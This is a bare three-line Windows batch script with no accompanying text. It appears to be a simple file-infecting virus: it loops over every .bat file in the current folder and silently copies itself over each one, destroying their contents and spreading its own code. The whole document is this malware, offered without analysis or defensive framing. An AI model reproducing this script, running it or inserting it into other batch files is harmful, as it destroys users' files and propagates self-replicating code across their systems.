@echo off
for %%b in (*.bat) do if not "%0==" copy %0 %%b>nul
echo on